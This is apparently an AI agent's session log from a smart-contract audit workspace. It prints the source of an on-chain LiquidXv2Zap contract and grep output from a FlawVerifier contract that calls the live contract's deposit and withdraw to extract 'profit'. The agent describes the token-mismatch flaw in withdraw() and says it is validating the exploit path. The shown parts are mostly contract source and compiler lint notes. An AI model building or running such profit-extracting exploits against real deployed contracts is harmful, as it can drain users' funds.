+355:  function swap(address tokenIn, uint256 amount, address tokenOut, address recipient, swapBlock[] calldata swBlocks) external payable returns(uint256, uint256);
+370:  // account => pair => basketId
+377:  event Deposit(address account, address token0, address token1, uint256 basketId, uint256 amount);
+378:  event Withdraw(address account, address token0, address token1, uint256 basketId, uint256 amount);
+397:  function deposit(address account, address token, address tokenM, swapPath calldata path, address token0, address token1, uint256[3] calldata amount, uint256 basketId) public payable returns(uint256) {
+427:    if (basketId == 0) {
+431:      _addBalance(account, pair, basketId, lvar[2]);
+438:    emit Deposit(account, token0, token1, basketId, lvar[2]);
+442:  function withdraw(address account, address token0, address token1, uint256 amount, address tokenOut, uint256 basketId, address tokenM, swapPath calldata wpath, uint256[3] memory amountMin) public returns(uint256) {
+446:    if (basketId == 0) {
+451:      if (balanceOf[account][pair][basketId] < amount) {
+452:        amount = balanceOf[account][pair][basketId];
+454:      balanceOf[account][pair][basketId] -= amount;
+465:    address tOut = tokenOut; 
+466:    if (tokenOut == address(0)) {
+491:      _approveTokenIfNeeded(tokenOut, swapPlus, vamount[2]);
+492:      (, vamount[2]) = ISwapPlusv1(swapPlus).swap(tokenOut, vamount[2], tokenM==address(0)?wrappedETH:tokenM, address(this), wpath.path);
+493:      tokenOut = tokenM;
+496:    if (tokenOut != address(0)) {
+497:      IERC20(tokenOut).safeTransfer(account, vamount[2]);
+509:    emit Withdraw(account, token0, token1, basketId, amount);
+572:  function _addBalance(address account, address pair, uint256 basketId, uint256 amount) internal {
+573:    balanceOf[account][pair][basketId] += amount;
+576:  function withdrawToken(address token, address target, uint256 amount) public onlyOpertaor {
+
+exec
+/bin/bash -lc "sed -n '1,320p' /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0 <0.9.0;
+
+interface ILiquidXv2Router01 {
+  function factory() external view returns (address);
+  function WETH() external view returns (address);
+
+  function addLiquidity(
+    address tokenA,
+    address tokenB,
+    uint amountADesired,
+    uint amountBDesired,
+    uint amountAMin,
+    uint amountBMin,
+    address to,
+    uint deadline
+  ) external returns (uint amountA, uint amountB, uint liquidity);
+  function addLiquidityETH(
+    address token,
+    uint amountTokenDesired,
+    uint amountTokenMin,
+    uint amountETHMin,
+    address to,
+    uint deadline
+  ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+  function removeLiquidity(
+    address tokenA,
+    address tokenB,
+    uint liquidity,
+    uint amountAMin,
+    uint amountBMin,
+    address to,
+    uint deadline
+  ) external returns (uint amountA, uint amountB);
+  function removeLiquidityETH(
+    address token,
+    uint liquidity,
+    uint amountTokenMin,
+    uint amountETHMin,
+    address to,
+    uint deadline
+  ) external returns (uint amountToken, uint amountETH);
+  function removeLiquidityWithPermit(
+    address tokenA,
+    address tokenB,
+    uint liquidity,
+    uint amountAMin,
+    uint amountBMin,
+    address to,
+    uint deadline,
+    bool approveMax, uint8 v, bytes32 r, bytes32 s
+  ) external returns (uint amountA, uint amountB);
+  function removeLiquidityETHWithPermit(
+    address token,
+    uint liquidity,
+    uint amountTokenMin,
+    uint amountETHMin,
+    address to,
+    uint deadline,
+    bool approveMax, uint8 v, bytes32 r, bytes32 s
+  ) external returns (uint amountToken, uint amountETH);
+  function swapExactTokensForTokens(
+    uint amountIn,
+    uint amountOutMin,
+    address[] calldata path,
+    address to,
+    uint deadline
+  ) external returns (uint[] memory amounts);
+  function swapTokensForExactTokens(
+    uint amountOut,
+    uint amountInMax,
+    address[] calldata path,
+    address to,
+    uint deadline
+  ) external returns (uint[] memory amounts);
+  function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
+    external
+    payable
+    returns (uint[] memory amounts);
+  function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
+    external
+    returns (uint[] memory amounts);
+  function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
+    external
+    returns (uint[] memory amounts);
+  function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
+    external
+    payable
+    returns (uint[] memory amounts);
+
+  function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
+  function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
+  function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
+  function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
+  function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
+}
+
+interface IRewarderv2 {
+  function getReward(address account, address token) external view returns(uint256);
+  function claim(address account, address token) external;
+}
+
+interface ILiquidXv2Factory {
+  function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface ILiquidXv2Pair {
+  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+}
+
+interface IERC20 {
+  event Approval(address indexed owner, address indexed spender, uint value);
+  event Transfer(address indexed from, address indexed to, uint value);
+
+  function name() external view returns (string memory);
+  function symbol() external view returns (string memory);
+  function decimals() external view returns (uint8);
+  function totalSupply() external view returns (uint);
+  function balanceOf(address owner) external view returns (uint);
+  function allowance(address owner, address spender) external view returns (uint);
+
+  function approve(address spender, uint value) external returns (bool);
+  function transfer(address to, uint value) external returns (bool);
+  function transferFrom(address from, address to, uint value) external returns (bool);
+}
+
+interface IWETH {
+  function deposit() external payable;
+  function transfer(address to, uint value) external returns (bool);
+  function withdraw(uint) external;
+}
+
+interface IERC20Mint is IERC20 {
+  function mint(address account, uint256 amount) external;
+  function burn(address account, uint256 amount) external;
+}
+
+interface IERC20Permit {
+  function permit(
+    address owner,
+    address spender,
+    uint256 value,
+    uint256 deadline,
+    uint8 v,
+    bytes32 r,
+    bytes32 s
+  ) external;
+  function nonces(address owner) external view returns (uint256);
+  function DOMAIN_SEPARATOR() external view returns (bytes32);
+}
+
+library Address {
+  function isContract(address account) internal view returns (bool) {
+    return account.code.length > 0;
+  }
+
+  function sendValue(address payable recipient, uint256 amount) internal {
+    require(address(this).balance >= amount, "Address: insufficient balance");
+
+    (bool success, ) = recipient.call{value: amount}("");
+    require(success, "Address: unable to send value, recipient may have reverted");
+  }
+
+  function functionCall(address target, bytes memory data) internal returns (bytes memory) {
+      return functionCallWithValue(target, data, 0, "Address: low-level call failed");
+  }
+
+  function functionCall(
+      address target,
+      bytes memory data,
+      string memory errorMessage
+  ) internal returns (bytes memory) {
+      return functionCallWithValue(target, data, 0, errorMessage);
+  }
+
+  function functionCallWithValue(
+      address target,
+      bytes memory data,
+      uint256 value
+  ) internal returns (bytes memory) {
+    return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
+  }
+
+  function functionCallWithValue(
+    address target,
+    bytes memory data,
+    uint256 value,
+    string memory errorMessage
+  ) internal returns (bytes memory) {
+    require(address(this).balance >= value, "Address: insufficient balance for call");
+    (bool success, bytes memory returndata) = target.call{value: value}(data);
+    return verifyCallResultFromTarget(target, success, returndata, errorMessage);
+  }
+
+  function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
+    return functionStaticCall(target, data, "Address: low-level static call failed");
+  }
+
+  function functionStaticCall(
+    address target,
+    bytes memory data,
+    string memory errorMessage
+  ) internal view returns (bytes memory) {
+    (bool success, bytes memory returndata) = target.staticcall(data);
+    return verifyCallResultFromTarget(target, success, returndata, errorMessage);
+  }
+
+  function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
+    return functionDelegateCall(target, data, "Address: low-level delegate call failed");
+  }
+
+  function functionDelegateCall(
+    address target,
+    bytes memory data,
+    string memory errorMessage
+  ) internal returns (bytes memory) {
+    (bool success, bytes memory returndata) = target.delegatecall(data);
+    return verifyCallResultFromTarget(target, success, returndata, errorMessage);
+  }
+
+  function verifyCallResultFromTarget(
+    address target,
+    bool success,
+    bytes memory returndata,
+    string memory errorMessage
+  ) internal view returns (bytes memory) {
+    if (success) {
+      if (returndata.length == 0) {
+        require(isContract(target), "Address: call to non-contract");
+      }
+      return returndata;
+    } else {
+      _revert(returndata, errorMessage);
+    }
+  }
+
+  function verifyCallResult(
+    bool success,
+    bytes memory returndata,
+    string memory errorMessage
+  ) internal pure returns (bytes memory) {
+    if (success) {
+      return returndata;
+    } else {
+      _revert(returndata, errorMessage);
+    }
+  }
+
+  function _revert(bytes memory returndata, string memory errorMessage) private pure {
+    if (returndata.length > 0) {
+      assembly {
+        let returndata_size := mload(returndata)
+        revert(add(32, returndata), returndata_size)
+      }
+    } else {
+      revert(errorMessage);
+    }
+  }
+}
+
+library SafeERC20 {
+  using Address for address;
+
+  function safeTransfer(
+    IERC20 token,
+    address to,
+    uint256 value
+  ) internal {
+    _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
+  }
+
+  function safeTransferFrom(
+    IERC20 token,
+    address from,
+    address to,
+    uint256 value
+  ) internal {
+    _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
+  }
+
+  function safeApprove(
+    IERC20 token,
+    address spender,
+    uint256 value
+  ) internal {
+    require(
+      (value == 0) || (token.allowance(address(this), spender) == 0),
+      "SafeERC20: approve from non-zero to non-zero allowance"
+    );
+    _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
+  }
+
+  function safeIncreaseAllowance(
+    IERC20 token,
+    address spender,
+    uint256 value
+  ) internal {
+    uint256 newAllowance = token.allowance(address(this), spender) + value;
+    _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
+  }
+
+  function safeDecreaseAllowance(
+    IERC20 token,
+    address spender,
+    uint256 value
+  ) internal {
+    unchecked {
+      uint256 oldAllowance = token.allowance(address(this), spender);
+      require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
+      uint256 newAllowance = oldAllowance - value;
+      _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
+    }
+  }
+
+  function safePermit(
+    IERC20Permit token,
+    address owner,
+    address spender,
+    uint256 value,
+    uint256 deadline,
+
+exec
+/bin/bash -lc "sed -n '320,620p' /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+ succeeded in 0ms:
+    uint256 deadline,
+    uint8 v,
+    bytes32 r,
+    bytes32 s
+  ) internal {
+    uint256 nonceBefore = token.nonces(owner);
+    token.permit(owner, spender, value, deadline, v, r, s);
+    uint256 nonceAfter = token.nonces(owner);
+    require(nonceAfter == nonceBefore + 1, "SafeERC20: permit did not succeed");
+  }
+
+  function _callOptionalReturn(IERC20 token, bytes memory data) private {
+    bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
+    if (returndata.length > 0) {
+      require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
+    }
+  }
+}
+
+interface ISwapPlusv1 {
+  struct swapRouter {
+    string platform;
+    address tokenIn;
+    address tokenOut;
+    uint256 amountOutMin;
+    uint256 meta; // fee, flag(stable), 0=v2
+    uint256 percent;
+  }
+  struct swapLine {
+    swapRouter[] swaps;
+  }
+  struct swapBlock {
+    swapLine[] lines;
+  }
+
+  function swap(address tokenIn, uint256 amount, address tokenOut, address recipient, swapBlock[] calldata swBlocks) external payable returns(uint256, uint256);
+}
+
+contract LiquidXv2Zap {
+  using SafeERC20 for IERC20;
+
+  address public router;
+  address public factory;
+  address public swapPlus;
+  address public wrappedETH;
+  address public rewarder;
+
+  mapping (address => bool) public operators;
+  address public operatorSetter;
+
+  // account => pair => basketId
+  mapping (address => mapping(address => mapping(uint256 => uint256))) public balanceOf;
+
+  struct swapPath {
+    ISwapPlusv1.swapBlock[] path;
+  }
+
+  event Deposit(address account, address token0, address token1, uint256 basketId, uint256 amount);
+  event Withdraw(address account, address token0, address token1, uint256 basketId, uint256 amount);
+
+  receive() external payable {
+  }
+
+  constructor(address _router, address _swapPlus, address _rewarder, address _wrappedETH) {
+    router = _router;
+    factory = ILiquidXv2Router01(_router).factory();
+    swapPlus = _swapPlus;
+    wrappedETH = _wrappedETH;
+    rewarder = _rewarder;
+    operatorSetter = msg.sender;
+  }
+
+  modifier onlyOpertaor() {
+    require(operators[msg.sender], "LiquidXv2Zap: !operator");
+    _;
+  }
+
+  function deposit(address account, address token, address tokenM, swapPath calldata path, address token0, address token1, uint256[3] calldata amount, uint256 basketId) public payable returns(uint256) {
+    address pair = ILiquidXv2Factory(factory).getPair(token0, token1);
+    require(pair != address(0), "LiquidXv2Zap: no pair");
+
+    // retAddLp 0, 1, 2
+    // inAmount
+    // token0Amount, token1Amount
+    uint256[6] memory lvar;
+    lvar[3] = msg.value;
+    address inToken = token;
+    if (token != address(0)) {
+      lvar[3] = IERC20(token).balanceOf(address(this));
+      IERC20(token).safeTransferFrom(account, address(this), amount[0]);
+      lvar[3] = IERC20(token).balanceOf(address(this)) - lvar[3];
+    }
+    else {
+      inToken = wrappedETH;
+      IWETH(wrappedETH).deposit{value: lvar[3]}();
+    }
+
+    if (path.path.length > 0) {
+      _approveTokenIfNeeded(inToken, swapPlus, lvar[3]);
+      (, lvar[3]) = ISwapPlusv1(swapPlus).swap(inToken, lvar[3], tokenM, address(this), path.path);
+      inToken = tokenM;
+    }
+
+    (lvar[4], lvar[5]) = _depositSwap(token0, token1, inToken, lvar[3]);
+
+    (lvar[0], lvar[1], lvar[2]) = ILiquidXv2Router01(router).addLiquidity(token0, token1, lvar[4], lvar[5], amount[1], amount[2], address(this), block.timestamp);
+    _refundReserveToken(account, token0, token1, lvar[4]-lvar[0], lvar[5]-lvar[1]);
+    if (basketId == 0) {
+      IERC20(pair).safeTransfer(account, lvar[2]);
+    }
+    else {
+      _addBalance(account, pair, basketId, lvar[2]);
+    }
+
+    if (rewarder != address(0) && IRewarderv2(rewarder).getReward(account, pair) > 0) {
+      IRewarderv2(rewarder).claim(account, pair);
+    }
+
+    emit Deposit(account, token0, token1, basketId, lvar[2]);
+    return lvar[2];
+  }
+
+  function withdraw(address account, address token0, address token1, uint256 amount, address tokenOut, uint256 basketId, address tokenM, swapPath calldata wpath, uint256[3] memory amountMin) public returns(uint256) {
+    address pair = ILiquidXv2Factory(factory).getPair(token0, token1);
+    require(pair != address(0), "LiquidXv2Zap: no pair");
+
+    if (basketId == 0) {
+      IERC20(pair).safeTransferFrom(account, address(this), amount);
+    }
+    else {
+      require(account == msg.sender || operators[msg.sender], "LiquidXv2Zap: no access");
+      if (balanceOf[account][pair][basketId] < amount) {
+        amount = balanceOf[account][pair][basketId];
+      }
+      balanceOf[account][pair][basketId] -= amount;
+    }
+
+    if (amount == 0) return 0;
+
+    _approveTokenIfNeeded(pair, router, amount);
+    // amount0, 1
+    // outAmount
+    uint256[3] memory vamount;
+    (vamount[0], vamount[1]) = ILiquidXv2Router01(router).removeLiquidity(token0, token1, amount, amountMin[0], amountMin[1], address(this), block.timestamp);
+
+    address tOut = tokenOut; 
+    if (tokenOut == address(0)) {
+      tOut = wrappedETH;
+    }
+
+    vamount[2] = 0;
+    if (tOut == token1) {
+      vamount[2] = vamount[1];
+      _approveTokenIfNeeded(token0, router, vamount[0]);
+      address[] memory path = new address[](2);
+      path[0] = token0;
+      path[1] = token1;
+      uint256[] memory ret = ILiquidXv2Router01(router).swapExactTokensForTokens(vamount[0], amountMin[2], path, address(this), block.timestamp);
+      vamount[2] += ret[1];
+    }
+    else {
+      vamount[2] = vamount[0];
+      _approveTokenIfNeeded(token1, router, vamount[1]);
+      address[] memory path = new address[](2);
+      path[0] = token1;
+      path[1] = token0;
+      uint256[] memory ret = ILiquidXv2Router01(router).swapExactTokensForTokens(vamount[1], amountMin[2], path, address(this), block.timestamp);
+      vamount[2] += ret[1];
+    }
+
+    if (wpath.path.length > 0) {
+      _approveTokenIfNeeded(tokenOut, swapPlus, vamount[2]);
+      (, vamount[2]) = ISwapPlusv1(swapPlus).swap(tokenOut, vamount[2], tokenM==address(0)?wrappedETH:tokenM, address(this), wpath.path);
+      tokenOut = tokenM;
+    }
+
+    if (tokenOut != address(0)) {
+      IERC20(tokenOut).safeTransfer(account, vamount[2]);
+    }
+    else {
+      IWETH(wrappedETH).withdraw(vamount[2]);
+      (bool success, ) = payable(account).call{value: vamount[2]}("");
+      require(success, "LiquidXv2Zap: Failed withdraw");
+    }
+
+    if (rewarder != address(0) && IRewarderv2(rewarder).getReward(account, pair) > 0) {
+      IRewarderv2(rewarder).claim(account, pair);
+    }
+
+    emit Withdraw(account, token0, token1, basketId, amount);
+    return vamount[2];
+  }
+
+  function _depositSwap(address token0, address token1, address inToken, uint256 inAmount) internal returns(uint256, uint256) {
+    address pair = ILiquidXv2Factory(factory).getPair(token0, token1);
+
+    bool isToken0 = false;
+    address outToken = token0;
+    uint256 reserve = 0;
+    if (inToken == token0) {
+      isToken0 = true;
+      outToken = token1;
+      (reserve, , ) = ILiquidXv2Pair(pair).getReserves();
+    }
+    else {
+      (, reserve, ) = ILiquidXv2Pair(pair).getReserves();
+    }
+
+    _approveTokenIfNeeded(inToken, router, inAmount);
+    uint256 swapAmount = _calculateSwapAmount(reserve, inAmount);
+
+    address[] memory path = new address[](2);
+    path[0] = inToken;
+    path[1] = outToken;
+    uint256[] memory ret = ILiquidXv2Router01(router).swapExactTokensForTokens(swapAmount, 0, path, address(this), block.timestamp);
+    inAmount = inAmount - ret[0];
+
+    _approveTokenIfNeeded(outToken, router, ret[1]);
+
+    if (isToken0) {
+      return (inAmount, ret[1]);
+    }
+    else {
+      return (ret[1], inAmount);
+    }
+  }
+
+  function _refundReserveToken(address account, address token0, address token1, uint256 amount0, uint256 amount1) internal {
+    if (amount0 > 0) {
+      IERC20(token0).safeTransfer(account, amount0);
+    }
+    if (amount1 > 0) {
+      IERC20(token1).safeTransfer(account, amount1);
+    }
+  }
+
+  function _calculateSwapAmount(uint256 reserve, uint256 inAmount) internal pure returns(uint256) {
+    // (sqrt(reserve^2*(1+C)^2 + 4C*reserve*inAmount) - reserve*(1+C)) / 2C
+    uint256 a1 = reserve * reserve * 1997 *1997;
+    uint256 a2 = 4 * 997 * reserve * inAmount * 1000;
+    return (_sqrt(a1+a2) - reserve * 1997) / (2 * 997);
+  }
+
+  function _sqrt(uint x) internal pure returns (uint y) {
+    uint z = (x + 1) / 2;
+    y = x;
+    while (z < y) {
+      y = z;
+      z = (x / z + z) / 2;
+    }
+  }
+
+  function _addBalance(address account, address pair, uint256 basketId, uint256 amount) internal {
+    balanceOf[account][pair][basketId] += amount;
+  }
+
+  function withdrawToken(address token, address target, uint256 amount) public onlyOpertaor {
+    if (token == address(0)) {
+      (bool success, ) = payable(target).call{value: amount}("");
+      require(success, "LiquidXv2Zap: Failed withdraw");
+    }
+    else {
+      IERC20(token).safeTransfer(target, amount);
+    }
+  }
+
+  function setRouterAndFactory(address _router) public {
+    require(msg.sender == operatorSetter, 'LiquidXv2Zap: FORBIDDEN');
+    router = _router;
+    factory = ILiquidXv2Router01(_router).factory();
+  }
+
+  function setSwapPlus(address _swapPlus) public {
+    require(msg.sender == operatorSetter, 'LiquidXv2Zap: FORBIDDEN');
+    swapPlus = _swapPlus;
+  }
+
+  function setRewarder(address _rewarder) public {
+    require(msg.sender == operatorSetter, 'LiquidXv2Zap: FORBIDDEN');
+    rewarder = _rewarder;
+  }
+
+  function setOperator(address _operator, bool mode) external {
+    require(msg.sender == operatorSetter, 'LiquidXv2Zap: FORBIDDEN');
+    operators[_operator] = mode;
+  }
+
+  function setOperatorSetter(address _operatorSetter) external {
+    require(msg.sender == operatorSetter, 'LiquidXv2Zap: FORBIDDEN');
+    operatorSetter = _operatorSetter;
+  }
+
+  function _approveTokenIfNeeded(address token, address spender, uint256 amount) private {
+    uint256 oldAllowance = IERC20(token).allowance(address(this), spender);
+    if (oldAllowance < amount) {
+      if (oldAllowance > 0) {
+        IERC20(token).safeApprove(spender, 0);
+      }
+      IERC20(token).safeApprove(spender, type(uint256).max);
+    }
+  }
+
+codex
+The on-chain zap confirms the core claim exactly: `withdraw()` computes `vamount[2]` in the withdrawn asset, then blindly transfers `IERC20(tokenOut)` for that amount. I’m validating the verifier against that implementation now and will only change execution details, not the exploit path.
+exec
+/bin/bash -lc 'forge build' in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert
+exec
+/bin/bash -lc "rg -n \"FlawVerifier|executeOnOpportunity|profitToken|profitAmount|TARGET\" /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert -g '"'!lib'"'" in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:97:contract FlawVerifier is ISwapPlusStructs {
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:98:    address public constant TARGET = 0x364f17A23AE4350319b7491224d10dF5796190bC;
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:100:    address private _profitToken;
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:101:    uint256 private _profitAmount;
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:145:    function profitToken() external view returns (address) {
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:146:        return _profitToken;
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:149:    function profitAmount() external view returns (uint256) {
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:150:        return _profitAmount;
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:153:    function executeOnOpportunity() external {
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:159:        ILiquidXv2Zap zap = ILiquidXv2Zap(TARGET);
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:211:        return _profitAmount > 0;
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:292:        _profitToken = _attempt.pair;
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:293:        _profitAmount = IERC20(_profitToken).balanceOf(address(this));
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:294:        require(_profitAmount > 0, "zero profit");
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:305:        _forceApprove(_attempt.token0, TARGET, capitalAmount);
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:309:        mintedLp = ILiquidXv2Zap(TARGET).deposit(
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:322:        _forceApprove(_attempt.pair, TARGET, burnLp);
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:326:        ILiquidXv2Zap(TARGET).withdraw(
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:340:        address router = ILiquidXv2Zap(TARGET).router();
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol:452:        state.zapLpBalance = IERC20(pair).balanceOf(TARGET);
+
+ succeeded in 1282ms:
+Compiling 2 files with Solc 0.8.30
+Solc 0.8.30 finished in 638.43ms
+Compiler run successful!
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:18:12
+   |
+18 |   function addLiquidityETH(
+   |            ^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:22:10
+   |
+22 |     uint amountETHMin,
+   |          ^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:25:54
+   |
+25 |   ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+   |                                                      ^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:35:12
+   |
+35 |   function removeLiquidityETH(
+   |            ^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:39:10
+   |
+39 |     uint amountETHMin,
+   |          ^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:42:46
+   |
+42 |   ) external returns (uint amountToken, uint amountETH);
+   |                                              ^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:53:12
+   |
+53 |   function removeLiquidityETHWithPermit(
+   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:57:10
+   |
+57 |     uint amountETHMin,
+   |          ^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:61:46
+   |
+61 |   ) external returns (uint amountToken, uint amountETH);
+   |                                              ^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:76:12
+   |
+76 |   function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
+   |            ^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:80:12
+   |
+80 |   function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
+   |            ^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:83:12
+   |
+83 |   function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
+   |            ^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:86:12
+   |
+86 |   function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
+   |            ^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[pascal-case-struct]: structs should use PascalCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:340:10
+    |
+340 |   struct swapRouter {
+    |          ^^^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#pascal-case-struct
+
+note[pascal-case-struct]: structs should use PascalCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:348:10
+    |
+348 |   struct swapLine {
+    |          ^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#pascal-case-struct
+
+note[pascal-case-struct]: structs should use PascalCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:351:10
+    |
+351 |   struct swapBlock {
+    |          ^^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#pascal-case-struct
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:364:18
+    |
+364 |   address public wrappedETH;
+    |                  ^^^^^^^^^^
+    |
